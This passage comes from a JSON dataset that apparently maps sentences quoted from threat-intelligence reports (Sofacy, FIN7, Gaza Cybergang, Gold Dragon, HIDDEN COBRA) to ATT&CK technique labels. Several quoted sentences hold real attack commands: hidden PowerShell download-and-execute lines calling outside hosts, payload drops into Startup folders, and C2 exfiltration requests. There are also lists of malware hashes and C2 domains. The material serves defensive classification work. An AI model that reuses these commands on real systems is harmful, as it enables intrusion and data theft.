        "The following shows this unused command, which exposed an additional server within Sofacy\u2019s infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:       C:\\\\Programs\\\\Microsoft\\\\MSOffice\\\\Word.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -sta -NonI -Whidden $e=(New-ObjectSystem.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');powershell -enc $e #     The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET",
        "The VBScript has a SHA256 has of 649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls two PowerShell commands to download and execute a payload and downloading and opening of a decoy document",
        "Then, it will launch Dec.exe using PowerShell with the command \u201c cmd.exe /c powershell - WindowStyle Hidden Start-Process Dec.exe - WindowStyle maximized \u201d.",
        "FIN6 used PowerShell to execute an encoded command",
        "The attacker made use of Cobalt Strike\u2019s \u201cpsexec\u201d lateral movement command to create a Windows service named with a random 16-character string on the target system and execute encoded PowerShell",
        "After decoding out the blob, analysts found a PowerShell script.",
        "Next, the script triggered a PowerShell stager",
        "The macro contains a PowerShell script to persist in the \"Run\" registry key, \"KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding\".",
        "Following successful infiltration, the malware persists through registry: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run The command line execution leads to PowerShell code executed from a different registry value .",
        "the PowerShell is executed using reflectively loaded ReflectivePicker from the Empire project",
        "PowerShell scripts that perform system reconnaissance and credential theft from Windows Credential Manager and then send this information back to Waterbug C& Cs."
    ],
    "deobfuscate/decode files or information powershell-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "powershell"
        ],
        "sentances": [
            "The subscription was configured to run a PowerShell command that read, decrypted, and executed the backdoor code directly from the new WMI property",
            "Upon execution, this command extracted, decrypted, and executed the PowerShell backdoor payload stored in the HiveUploadTask text property of the RacTask class"
        ]
    },
    "windows management instrumentation powershell-multi": {
        "technique_names": [
            "windows management instrumentation",
            "powershell"
        ],
        "sentances": [
            "POSHSPY WMI Component The WMI component of the POSHSPY backdoor leverages a Filter to execute the PowerShell component of the backdoor on a regular basis"
        ]
    },
    "system owner/user discovery masquerading account discovery scripting user execution-multi": {
        "technique_names": [
            "system owner/user discovery",
            "masquerading",
            "account discovery",
            "scripting",
            "user execution"
        ],
        "sentances": [
            "Figure 2: Textbox inside DOC The combined script from Word textbox drops the following components: \\Users\\[user_name]\\Intel\\58d2a83f7778d5.36783181.vbs \\Users\\[user_name]\\Intel\\58d2a83f777942.26535794.ps1 \\Users\\[user_name]\\Intel\\58d2a83f777908.23270411.vbs Also, the script creates a named schedule task for persistence to launch \u201c58d2a83f7778d5.36783181.vbs\u201d every 25 minutes"
        ]
    },
    "obfuscated files or information powershell-multi": {
        "technique_names": [
            "obfuscated files or information",
            "powershell"
        ],
        "sentances": [
            "PowerShell Script \u201c58d2a83f777942.26535794.ps1\u201d is a multilayer obfuscated PowerShell script, which launches shellcode for a Cobalt Strike stager"
        ]
    },
    "file deletion exfiltration over command and control channel-multi": {
        "technique_names": [
            "file deletion",
            "exfiltration over command and control channel"
        ],
        "sentances": [
            "This version of HALFBAKED connects to the following C2 server: hxxp://198[.]100.119.6:80/cd hxxp://198[.]100.119.6:443/cd hxxp://198[.]100.119.6:8080/cd This version of HALFBAKED listens for the following commands from the C2 server:  info: Sends victim machine information (OS, Processor, BIOS and running processes) using WMI queries processList: Send list of process running screenshot: Takes screen shot of victim machine (using 58d2a83f777688.78384945.ps1) runvbs: Executes a VB script runexe: Executes EXE file runps1: Executes PowerShell script delete: Delete the specified file update: Update the specified file  All communication between the backdoor and attacker C2 are encoded using the following technique, represented in pseudo code: Function send_data(data) \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0random_string = custom_function_to_generate_random_string() \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0encoded_data = URLEncode(SimpleEncrypt(data)) \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0post_data(\"POST\u201d, random_string & \"=\" & encoded_data, Hard_coded_c2_url, Create_Random_Url(class_id)) The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information based on our investigations of a variety of topics discussed in this post, including FIN7 and the HALFBAKED backdoor"
        ]
    },
    "timestomp system information discovery shortcut modification-multi": {
        "technique_names": [
            "timestomp",
            "system information discovery",
            "shortcut modification"
        ],
        "sentances": [
            "For example, one of these FIN7 LNK files contained the following properties:  Version: 0 NetBIOS name: andy-pc Droid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca Droid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268 Birth droid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca Birth droid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268 MAC address: 08:00:27:3d:52:68 UUID timestamp: 03/21/2017 (12:12:28.500) [UTC] UUID sequence number: 2861  From this LNK file, we can see not only what the shortcut launched within the string data, but that the attacker likely generated this file on a VirtualBox system with hostname \u201candy-pc\u201d on March 21, 2017"
        ]
    },
    "system owner/user discovery scripting-multi": {
        "technique_names": [
            "system owner/user discovery",
            "scripting"
        ],
        "sentances": [
            "JAVASCRIPT CODE SNIPPETS:  The first stage JavaScript copies additional JavaScript code snippets in txt format from the RTF document into a random directory \u201cC:\\Users\\<User Name>\\<Random guid>\\\u201d"
        ]
    },
    "scheduled task data staged scripting obfuscated files or information-multi": {
        "technique_names": [
            "scheduled task",
            "data staged",
            "scripting",
            "obfuscated files or information"
        ],
        "sentances": [
            "Additionally, the first stage JavaScript creates a scheduled task that executes the second stage code within a minute \u2013 this delayed execution helps to bypass behavior analysis since the second stage is not directly executed by the first stage"
        ]
    },
    "scripting powershell-multi": {
        "technique_names": [
            "scripting",
            "powershell"
        ],
        "sentances": [
            "This task is executed every 25 minutes and will repeat the actions described above \u2013 recreating the JavaScript code which later will create and execute a PowerShell script (described below)",
            "The latter PowerShell injects a shellcode into its own process using well-known CreateThread and VirtualAlloc techniques: \u00a0 SHELLCODE: The shellcode phase of this attack is unique and demonstrates the constantly advancing abilities of attackers",
            "The fact that the actor used Metasploit shellcode within the Unicorn generated PowerShell script leads us to speculate that the ultimate payload of this attack is Meterpreter, which is a shellcode-based payload",
            "The x command treats the supplied data as a PowerShell script that it will write to the current PowerShell script (Office365DCOMCheck.ps1/SystemDiskClean.ps1), effectively overwriting the initial PowerShell script with a secondary payload script"
        ]
    },
    "scripting registry run keys / startup folder powershell-multi": {
        "technique_names": [
            "scripting",
            "registry run keys / startup folder",
            "powershell"
        ],
        "sentances": [
            "SECOND STAGE JAVASCRIPT INTO POWERSHELL: The second stage JavaScript creates a PowerShell file with the same name in the same directory"
        ]
    },
    "audio capture data encoding-multi": {
        "technique_names": [
            "audio capture",
            "data encoding"
        ],
        "sentances": [
            "Having a Meterpreter session on a compromised computer allows for full control of the computer and exfiltration of any data, and in some cases lateral movement inside the organization"
        ]
    },
    "masquerading file and directory discovery data staged-multi": {
        "technique_names": [
            "masquerading",
            "file and directory discovery",
            "data staged",
            "tor"
        ],
        "sentances": [
            "Stage 1 sample file: 3amadi_hamas.zip MD5: e686ffa90b2bfb567547f1c0dad1ae0b Type: Compressed container Child file/lure name: \u0645\u062d\u0636\u0631 \u0627\u062c\u062a\u0645\u0627\u0639 \u0627\u0644\u0639\u0645\u0627\u062f\u064a \u0645\u0639 \u0647\u0646\u064a\u0629 \u0631\u064a\u0654\u064a\u0633 \u062d\u0645\u0627\u0633 \u0627\u0645\u0633 \u0627\u0644\u0627\u062d\u062f .exe Child file/lure MD5: 92dd0f16e8ae274d83ba1d0d5b2e342  This sample ZIP file, which is similar to many other stage 1 downloaders in this campaign, contains an executable that is a compiled AutoIt script and which embeds some interesting functions (listed in the table below)"
        ]
    },
    "masquerading registry run keys / startup folder-multi": {
        "technique_names": [
            "masquerading",
            "registry run keys / startup folder"
        ],
        "sentances": [
            "Embedded functions Sleep, 15000  UrlDownloadToFile, https://upload.cat/0037e96c45ac2098?download_token=fa26750b7e73f0081c44831d0aaf9863c75592724dbc2f781ca495f9b5fbd4ac, %AppData%\\Microsoft\\Windows\\Picture2.exe 6240c31d9a82dc70a38f78d44a1ee239  sleep,4000  UrlDownloadToFile, https://upload.cat/089590f6d72aeaef?download_token=dd21809321669aa2229b20b57e2c9d34a3b507b5df7406bcac5dbb87cd169b78, %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Picture4.exe cab62bb5f00fe15683c6af760c8e8f7e  sleep,4000  UrlDownloadToFile, https://dev-point.co/uploads1/4ee1d5a5b0e41.jpg, %AppData%\\Thr0om.jpg  c90f9c600169cbedbeb23316ea61e214  sleep,4000  UrlDownloadToFile, https://upload.cat/ec9d388339b19e1c?download_token=131d5450c192d0591f3d06841eacc5bf5f344be9725be9456e2c222d0b4831e2, %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\333Po333.exe 8c5f8d1ab7baa9a0764cd5650ddecd8e  sleep,5000  UrlDownloadToFile, https://upload.cat/9a08bc13e683d330?download_token=90f1ebb4e1f52835f502bea4307686afc1eb1cdee973cef1fb043febb2a92078, %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsFrom444444.exe 2a3aa1d207030d8c7dc3cfc9c2d9f9f1  sleep,5000  UrlDownloadToFile, https://upload.cat/a1c05c819dadeefb?download_token=c6535b11a9f9bbf9e7681be8753f2058bac0df5264744be76605244e96a388f5, %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsFrom355353.exe bd83269da75741303a19b826c5f9627d  sleep,5000  RunWait %AppData%\\Microsoft\\Windows\\Picture2.exe ,, hide sleep,2000 After analyzing the files downloaded from the above first stage malware, it was clear that the threat actor wanted to achieve stable persistence on the victim machine, and also used more than one technique to exfiltrate data"
        ]
    },
    "data from local system file and directory discovery data staged-multi": {
        "technique_names": [
            "data from local system",
            "file and directory discovery",
            "data staged",
            "tor"
        ],
        "sentances": [
            "The threat actor\u2019s main objective for using this RAT (known as Razy/NeD worm/Wonder Botnet) was obvious from the victim data that was collected \u2013 it was to search for specific file extensions such as PDF, DOC, DOCX, XLS, and XLSX, where they are compressed in RAR files per category, stored in temp directories within a folder named by victim ID (bot ID \u2013 long MD5 string), encrypted and uploaded to the C2"
        ]
    },
    "standard application layer protocol command-line interface-multi": {
        "technique_names": [
            "standard application layer protocol",
            "command-line interface"
        ],
        "sentances": [
            "SHUTDOWN Shuts down the system using cmd /s /t 0   RESTART Reboots the system using cmd /r /t 0   PROCANDSOFT Lists all active processes and all installed software and uploads the results to the C2 server using a POST command at the \u201c/log.php\u201d",
            "Available Commands The XAgent C2 server will provide commands for the Trojan to run on the compromised system within its response to inbound HTTP request"
        ]
    },
    "exfiltration over command and control channel data compressed-multi": {
        "technique_names": [
            "exfiltration over command and control channel",
            "data compressed"
        ],
        "sentances": [
            "RAR Creates RAR files per logical drive containing data with timestamps for the past 7 days, then uploads RAR to the C2 server using a POST command at the path \u201c/FeedBack.php\u201d"
        ]
    },
    "process hollowing masquerading exploitation for privilege escalation-multi": {
        "technique_names": [
            "process hollowing",
            "masquerading",
            "exploitation for privilege escalation"
        ],
        "sentances": [
            "Appendix I \u2013 Main historical checkpoints and politicized decoys Gaza Cybergang Group1 2016-2019    MD5 Hash First seen Filename/Decoy Translation/Explanation C2 server   B3a472f81f800b32fe6595f44c9bf63b Feb 2016 \u0628\u0631\u0642\u064a\u0629 \u0648\u0632\u0627\u0631\u0629 \u0627\u0644\u062e\u0627\u0631\u062c\u064a\u0629 \u0627\u0644\u062a\u0631\u0643\u064a\u0629 \u0644\u0633\u064a\u0627\u062f\u062a\u0643\u0645 \u062d\u0648\u0644 \u0645\u0648\u0636\u0648\u0639 \u0647\u0627\u0645.exe  Translation: Letter for you from the Turkish Ministry of Foreign Affairs on Russian military operations in Syria en.gameoolines.com (185.117.72.190)   Df3f3ad279ca98f947214ffb3c91c514 e8a29c7a6f6c0140152ca8a01e336b37 March 2016 president abu mazen meetings with khaled meshaal.lha   dw.downloadtesting.com (185.117.75.105)   f9bcc21fbb40247167c8c85ed6ef56e3 March 2016 \u062f\u0631\u0627\u0633\u0629.lha   Dl.topgamse.com (45.63.97.44)   D9dbb65a42ffe0575f0e99f7498a593e April 2016 \u0628\u0631\u0642\u064a\u0629 \u0627\u0644\u062e\u0627\u0631\u062c\u064a\u0629 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629 \u0644\u0633\u064a\u0627\u062f\u062a\u0643\u0645 \u064a\u0631\u062c\u064a \u0627\u0644\u0625\u0637\u0644\u0627\u0639 \u2013 \u0645\u0647\u0645.exe  Translation: Saudi Foreign Affairs telegram for you, please see \u2013 important.exe en.gameoolines.com (185.117.72.190)   221EEF8511169C0496BBC79F96E84A4A April 2016 \u062a\u0642\u0631\u064a\u0631 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629 \u0648\u0627\u0644\u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0627\u0644\u0645\u062a\u0648\u0641\u0631 \u2013 \u0648\u0646\u0633\u062a\u0643\u0645\u0644 \u0639\u0646\u062f \u0627\u0644\u062a\u0648\u0641\u0631.exe  Translation: Report on Saudi available information, to be updated with new info upon availability dw.downloadtesting.com (185.117.75.105)   62DF4BC3738BE5AD4892200A1DC6B59A Inside: 55d33d9da371fdfe7871f2479621444a May 2016 \u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0639\u0646 \u0647\u062c\u0648\u0645 \u0645\u062d\u062a\u0645\u0644 \u0645\u0646 \u0627\u0644\u062d\u0648\u062b\u064a\u064a\u0646 \u0639\u0644\u0649 \u0645\u0648\u0627\u0642\u0639 \u0633\u0639\u0648\u062f\u064a\u0629 \u2013 \u062e\u0627\u0635.exe  Translation: Information on possible attack by Houthis on Saudi sites \u2013 private dw.downloadtesting.com (185.117.75.105)   838696872F924D28B08AAAA67388202E May 2016 \u0639\u0627\u062c\u0644 \u0627\u0644\u0645\u062e\u0627\u0628\u0631\u0627\u062a \u0627\u0644\u0645\u0635\u0631\u064a\u0629.exe  Translation: Urgent Egyptian Intelligence dw.downloadtesting.com (185.117.75.105)   e8be9843c372d280a506ac260567bf91 May 2016 \u0628\u0631\u0642\u064a\u0629 \u0648\u0632\u0627\u0631\u0629 \u0627\u0644\u062e\u0627\u0631\u062c\u064a\u0629 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629.exe  Translation: Saudi Foreign Affairs telegram.exe Message on the 34th GCC for Interior Ministers",
            "The webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the affected users\u2019 system to download the below payload: \u00a0\u00a0\u00a0 function runmumaa() \u00a0\u00a0\u00a0 On Error Resume Next \u00a0\u00a0\u00a0 set shell=createobject(\"Shell.Application\") \u00a0\u00a0\u00a0 shell.ShellExecute \"powershell.exe\",\"-NoLogo -NoProfile \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 -NonInteractive -WindowStyle Hidden ( New-Object \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u201cSystem.Net.WebClient\u201d).DownloadFile(\u201chttp://www.playboysplus.com\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 /install/install.exe\u201d,\u201dinstall.exe\u201d);Invoke-Item install.exe\", \"\", \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \"open\", 1 \u00a0\u00a0\u00a0 end function The CVE-2014-6332 exploit code seen in this incident is derived from the code published at http://www.exploit-db.com/exploits/35230/, which has also been incorporated in the Metasploit project"
        ]
    },
    "process hollowing custom cryptographic protocol masquerading process injection regsvr32 web service exfiltration over command and control channel network service scanning system time discovery windows admin shares-multi": {
        "technique_names": [
            "process hollowing",
            "custom cryptographic protocol",
            "masquerading",
            "process injection",
            "regsvr32",
            "web service",
            "exfiltration over command and control channel",
            "network service scanning",
            "system time discovery",
            "windows admin shares"
        ],
        "sentances": [
            "Wiknet.wikaba.com (192.169.7.250) Wiknet.mooo.com   342a4d93df060289b2d8362461875905 Oct 2018 \u062a\u0633\u0631\u064a\u0628 \u0645\u0646 \u062f\u0627\u062e\u0644 \u0627\u0644\u0642\u0646\u0635\u0644\u064a\u0629 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629 \u062d\u0648\u0644 \u0645\u0642\u062a\u0644 \u062c\u0645\u0627\u0644 \u062e\u0627\u0634\u0642\u062c\u064a.exe Translation: Leak from the Saudi consulate on the death of Jamal Khashoggi Time-loss.dns05.com (192.169.7.250)   c9cae9026ee2034626e4a43cfdd8b192 Jan 2019 \u0645\u062d\u0636\u0631 \u0627\u062c\u062a\u0645\u0627\u0639 \u0627\u0644\u0633\u0641\u064a\u0631 \u0627\u0644\u0642\u0637\u0631\u064a \u0627\u0644\u0639\u0645\u0627\u062f\u064a \u0645\u0639 \u0627\u0644\u0648\u0641\u062f \u0627\u0644\u0645\u0635\u0631\u064a \u0641\u064a \u0631\u0627\u0645 \u0627\u0644\u0644\u0647 .exe Translation: Minutes of meeting of Qatari Ambassador Emadi with the Egyptian delegation in Ramallah Time-loss.dns05.com (192.169.7.250) dji-msi.2waky.com    Appendix II \u2013 Indicators of compromise    Type IoC Description   RAR md5 E686FFA90B2BFB567547F1C0DAD1AE0B Stage 1 executable / lure   RAR md5 CE5AA4956D4D0D66BED361DDD7DB1A3B Stage 1 executable / lure   RAR md5 4F34902C9F458008BAE26BFA5C1C00DA Stage 1 executable / lure   RAR md5 535F8EA65969A84A68CEAF88778C6176 Stage 1 executable / lure   RAR md5 E8A29C7A6F6C0140152CA8A01E336B37 Stage 1 executable / lure   RAR md5 E782610BF209E81ECC42CA94B9388580 Stage 1 executable / lure   RAR md5 F9BCC21FBB40247167C8C85ED6EF56E3 Stage 1 executable / lure   EXE md5 33369AFD3042326E964139CABA1888D3 Stage 2 executable (19182-exe) that invokes Pastebin chain   EXE md5 2AD88AE20D8F4CB2C74CAE890FEB337A Stage 2 executable (1918-exe) that invokes Pastebin chain   EXE md5 55929FF3E67D79F9E1E205EBD38BC494 Stage 2 executable (21918-exe) that invokes Pastebin chain   EXE md5 DA486DF0D8E03A220808C3BFA5B40D06 Stage 2 executable (Adope-exe) that invokes Pastebin chain   EXE md5 C7F98F890B21C556D16BFF55E33C33AB Stage 2 executable (Application-exe) that invokes Pastebin chain   EXE md5 FAFCC11AF99ACF1B70997BC4BF36CFC0 Stage 2 executable (bind-exe) which is a backdoored Tile Slide Puzzle computer game that invokes Pastebin chain \u2013 code freely available   EXE md5 28CACBF64141F50426830B385AB1BE4C Dell-cmd \u2013 Command string to Delete User Temp directory   EXE md5 F30C00E87C7EE27033DC0AC421F3B4F8 Stage 2 executable (D-exe) that invokes Pastebin chain   EXE md5 51A59AEC24B5046EC4615728A5B52802 Stage 2 executable (Dv-exe) that invokes Pastebin chain   EXE md5 98BDE191AE6E2F7D8D4166C4B21A27D2 Office-vbs \u2013 github.gist lolpoke/system1   EXE md5 9E152A6ADCB57D44284AF3B6FD0C94C2 Stage 2 executable (p0w-exe) that invokes Pastebin chain   EXE md5 CAB62BB5F00FE15683C6AF760C8E8F7E wPic4-exe \u2013 RAT executable similar to Pictures4.exe   EXE md5 192DD65864119017AA307BE3363E31BB Powe1-exe \u2013 executable that uses scheduled tasks to execute VB scripts   EXE md5 71E462260F45C5E621A5F5C9A5724844 WinPeggy4-exe \u2013 backdoored Peggy Bees computer game \u2013 source code available on Microsoft site   EXE md5 AB98768D2440E72F42FCD274806F8D2A WinPeggy-exe \u2013 another variant of WinPeggy4.exe   EXE md5 DAACE673B1F4DFE8A4D3D021C5190483 Word-hta \u2013 VBS code to invoke PowerShell from github.gist..0lol0/system1.ps1   EXE md5 1529AE427FE4EB2D9B4C3073B2AA9E10 Word-vbs \u2013 VBS code to invoke PowerShell from github.gist lolpoke/system1.ps1   Powershell md5 CCD324DF0F606469FCA3D1C6FFA951AD System1.ps1 \u2013 PowerShell script that invoke a binary in memory that uses NETSH commands to allow programs, then execute a Trojan downloaded from myftp[.]biz   Powershell md5 D153FF52AE717D8CF26BEF57BDB7867D Install.ps1 \u2013 PowerShell script that invoke a cobalt strike beacon   EXE md5 AD1C91BF5E7D1F0AAF2E4EFB8FB79ADE Stage 2 executable (res-vbs) that invokes Pastebin chain   EXE md5 EE3AD5B06DBC6CCA7FDC9096697A9B4A Re-vbs \u2013 VBS script that uses Pastebin data to create scheduled task and run JScript to invoke RAT   EXE md5 805CA34E94DA9615C13D8AF48307FB07 Folder.exe \u2013 another RAT variant based on Pastebin chain   EXE md5 F330703C07DDD19226A48DEBA4E8AA08 Stage 2 executable (shell-exe) that invokes Pastebin chain   EXE md5 CFD2178185C40C9E30AADA7E3F667D4B Another RAT variant based on Pastebin chain   EXE md5 C2EE081EC3ADEF4AFACAB1F326EE50FF 2poker2.exe \u2013 use PowerShell command to invoke base64 string from Pastebin and create another RAT variant   EXE md5 B3A472F81F800B32FE6595F44C9BF63B Stage 1 executable / lure   EXE md5 DF3F3AD279CA98F947214FFB3C91C514 Stage 1 executable / lure   EXE md5 221EEF8511169C0496BBC79F96E84A4A Stage 1 executable / lure   EXE md5 62DF4BC3738BE5AD4892200A1DC6B59A Stage 1 executable / lure   EXE md5 55D33D9DA371FDFE7871F2479621444A Stage 1 executable / lure   EXE md5 838696872F924D28B08AAAA67388202E Stage 1 executable / lure   EXE md5 E8BE9843C372D280A506AC260567BF91 Stage 1 executable / lure   EXE md5 55D33D9DA371FDFE7871F2479621444A Stage 1 executable / lure   EXE md5 D9DBB65A42FFE0575F0E99F7498A593E Stage 1 executable / lure   EXE md5 5DB18AB35D29D44DDA109F49D1B99F38 Stage 1 executable / lure   EXE md5 DAE24E4D1DFCDD98F63F7DE861D95182 Stage 1 executable / lure   EXE md5 2358DBB85A29167FA66EE6BF1A7271CD Stage 1 executable / lure   EXE md5 10DFA690662B9C6DB805B95500FC753D Stage 1 executable / lure   EXE md5 6B5946E326488A8C8DA3AAEC2CB6E70F Stage 1 executable / lure   EXE md5 342A4D93DF060289B2D8362461875905 Stage 1 executable / lure   EXE md5 C9CAE9026EE2034626E4A43CFDD8B192 Stage 1 executable / lure   Network dji-msi.2waky.com External C2 domain; rotates with the others over time   Network checktest.www1.biz External C2 domain; rotates with the others over time   Network fulltest.yourtrap.com External C2 domain; rotates with the others over time   Network microsoft10.compress.to External C2 domain; rotates with the others over time   Network mmh.ns02.us External C2 domain; rotates with the others over time   Network ramliktest.mynetav.org External C2 domain; rotates with the others over time   Network testhoward.mysecondarydns.com External C2 domain; rotates with the others over time   Network testmace.compress.to External C2 domain; rotates with the others over time   Network time-loss.dns05.com External C2 domain; rotates with the others over time   Network wiknet.mooo.com External C2 domain; rotates with the others over time   Network Wiknet.wikaba.com External C2 domain; rotates with the others over time   Network supports.mefound.com External C2 domain; rotates with the others over time   Network saso10.myftp.biz External C2 server used by PowerShell scripts to download malware   Network 192.169.7.250 External C2 server (most active)   Network 104.200.67.190 External C2 server (least active)   Network 185.117.72.190 External C2 server (least active)   Network 45.63.97.44 External C2 server (least active)"
        ]
    },
    "timestomp masquerading file deletion data staged-multi": {
        "technique_names": [
            "timestomp",
            "masquerading",
            "file deletion",
            "data staged"
        ],
        "sentances": [
            "If HWP.exe is found running on the system, the malware finds the currently open file in HWP by extracting the file path from the command-line argument passed to HWP.exe This word file (usually named *.hwp) is copied into the temporary file path  C:\\DOCUME~1\\<username>\\LOCALS~1\\Temp\\2.hwp  hwp is an exact copy of the file loaded into HWP.exe The malware reads the contents of 2.hwp and finds an \u201cMZ magic marker\u201d in the file indicated by the string \u201cJOYBERTM\u201d   Checking for the MZ marker in the HWP file"
        ]
    },
    "system owner/user discovery registry run keys / startup folder data encrypted-multi": {
        "technique_names": [
            "system owner/user discovery",
            "registry run keys / startup folder",
            "data encrypted"
        ],
        "sentances": [
            "Any information gathered from the endpoint is first stored in the following file, encrypted, and sent to the control server:  C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  The following information is gathered from the endpoint, stored in the file 1.hwp, and sent to the control server:  Directory listing of the user\u2019s Desktop folder using command:  cmd.exe /c dir C:\\DOCUME~1\\<username>\\Desktop\\ >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Directory listing of the user\u2019s recently accessed files using command:  cmd.exe /c dir C:\\DOCUME~1\\<username>\\Recent >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Directory listing of the system\u2019s %programfiles% folder using command:  cmd.exe /c dir C:\\PROGRA~1\\ >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Systeminfo of the endpoint using command:  cmd.exe /c systeminfo >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Copies the file ixe000.bin from:  C:\\Documents and Settings\\<username>\\Application Data\\Microsoft\\Windows\\UserProfiles\\ixe000.bin To: C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp  Registry key and value information for the current user\u2019s Run key (with information collected):  HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Number of subkeys (<KeyIndex>) <KeyName> Number of Values under each key including the parent Run key (<ValueIndex>) <Value_Name> <Value_Content>  Registry Run key enumeration by Gold Dragon"
        ]
    },
    "data staged data encrypted-multi": {
        "technique_names": [
            "data staged",
            "data encrypted"
        ],
        "sentances": [
            "An example of 1.hwp with registry and system information:  Gold Dragon executes these steps executed in the exfiltration process:  Once the malware has gathered the required data from the endpoint, it encrypts the data file 1.hwp using the password \u201cwww[dot]GoldDragon[dot]com\u201d The encrypted content is written to the data file 1.hwp"
        ]
    },
    "standard application layer protocol exfiltration over alternative protocol data encoding data encrypted-multi": {
        "technique_names": [
            "standard application layer protocol",
            "exfiltration over alternative protocol",
            "data encoding",
            "data encrypted"
        ],
        "sentances": [
            "During the exfiltration process, the malware Base64-encodes the encrypted data and sends it to its control server using an HTTP POST request to the URL:  http://ink[dot]inkboom.co.kr/host/img/jpg/post.php  HTTP data/parameters used in the request include:  Content-Type: multipart/form-data; boundary=\u2014-WebKitFormBoundar ywhpFxMBe19cSjFnG <followed by base64 encoded & encrypted system info> User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322) Accept-Language: en-us HTTP Version: HTTP/1.0    The malware can also download and execute additional components served to it by the control server"
        ]
    },
    "system owner/user discovery remote file copy-multi": {
        "technique_names": [
            "system owner/user discovery",
            "remote file copy"
        ],
        "sentances": [
            "The mechanism for downloading additional components is based on the Computer Name and UserName of the endpoint provided by the malware process to the control server in the following HTTP GET request: GET http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?filename=<Computer_Name>_<username>&continue=dnsadmin After successfully retrieving the component from the control server, the next-stage payload is copied to the Application Data directory of the current user and executed: C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\hupdate.ex (note \u201cex,\u201d not \u201cexe\u201d)  The capability to download additional components from the control server"
        ]
    },
    "disabling security tools process discovery-multi": {
        "technique_names": [
            "disabling security tools",
            "process discovery"
        ],
        "sentances": [
            "The malware demonstrates its evasive behavior by checking for the presence of specific processes related to antimalware products:  The presence of any process with the keywords \u201cv3\u201d and \u201ccleaner.\u201d   Checking for antimalware or cleaner processes"
        ]
    },
    "deobfuscate/decode files or information input capture-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "input capture"
        ],
        "sentances": [
            "From our analysis, stealing keystrokes is the main function of RunningRat; however, the DLL has code for more extensive functionality"
        ]
    },
    "clipboard data file deletion indicator removal on host-multi": {
        "technique_names": [
            "clipboard data",
            "file deletion",
            "indicator removal on host",
            "tor"
        ],
        "sentances": [
            "Code is included to copy the clipboard, delete files, compress files, clear event logs, shut down the machine, and much more"
        ]
    },
    "security software discovery hidden files and directories-multi": {
        "technique_names": [
            "security software discovery",
            "hidden files and directories",
            "tor"
        ],
        "sentances": [
            "For more information related to HIDDEN COBRA activity, go to https://www.us-cert.gov/hiddencobra.If users or administrators detect the custom tools indicative of HIDDEN COBRA, these tools should be immediately flagged, reported to the DHS National Cybersecurity Communications and Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and given highest priority for enhanced mitigation"
        ]
    },
    "security software discovery remote system discovery-multi": {
        "technique_names": [
            "security software discovery",
            "remote system discovery"
        ],
        "sentances": [
            "Cyber analysts are encouraged to review the information provided in this alert to detect signs of malicious network activity.Tools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware",
